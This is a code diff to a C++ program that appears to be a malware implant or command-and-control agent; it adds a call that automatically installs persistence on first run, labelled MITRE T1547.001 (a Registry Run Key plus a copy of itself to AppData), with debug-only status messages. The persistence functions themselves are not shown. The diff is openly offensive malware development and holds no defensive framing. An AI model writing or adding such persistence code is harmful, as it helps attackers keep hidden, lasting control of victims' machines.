@@ -11,6 +11,7 @@
 #include "task.h"
 #include "pe-exec.h"
 #include "file_utils.h"
+#include "persistence.h"
 
 using namespace std;
 
@@ -386,6 +387,29 @@ void agent_run() {
         return;
     }
     #endif
+
+    // ===== AUTO-PERSISTENCE (MITRE T1547.001) =====
+    // Install persistence on first run (Registry Run Key + copy to AppData)
+    if (!is_persistence_installed()) {
+        #ifdef _DEBUG
+        cout << "[*] Installing persistence..." << endl;
+        #endif
+        
+        if (install_persistence()) {
+            #ifdef _DEBUG
+            cout << "[+] Persistence installed successfully" << endl;
+            cout << get_persistence_status() << endl;
+            #endif
+        } else {
+            #ifdef _DEBUG
+            cerr << "[!] Failed to install persistence" << endl;
+            #endif
+        }
+    } else {
+        #ifdef _DEBUG
+        cout << "[*] Persistence already installed" << endl;
+        #endif
+    }
 
     #ifdef _DEBUG
     cout << "==================================" << endl;
